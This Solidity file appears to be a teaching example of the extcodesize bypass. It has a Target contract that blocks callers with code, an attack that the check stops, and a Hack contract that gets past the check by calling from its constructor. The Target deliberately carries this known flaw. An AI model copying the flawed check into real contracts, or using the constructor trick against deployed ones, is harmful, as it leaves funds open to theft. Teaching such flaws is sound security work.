// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract Target {

    // protected => withdraw funds
    bool public noContract = false;
    uint256 public funds = 100;

    function protected() public {
        require(!isContract(msg.sender), "no contract allowed");
        noContract = true;
    }

    modifier nonContract() {
        require(noContract == true, "no contract allowed");
        _;
    }

    function isContract(address account) public view returns(bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0; // contract has a positive code size
    }

    function addFunds() external nonContract {
        funds += 20;
    }
}

contract failedAttack {
    function tryAttack(address _target) external {
        Target target = Target(_target);
        target.protected();
    }
}

contract Hack {
    // The goal of hack contract is to change noContract variable in Target contract
    // so that it can execute withdrawFunds
    // a contract in constructor is zero size
    constructor(address _target) {
        Target(_target).protected();
        Target(_target).addFunds();
    }
}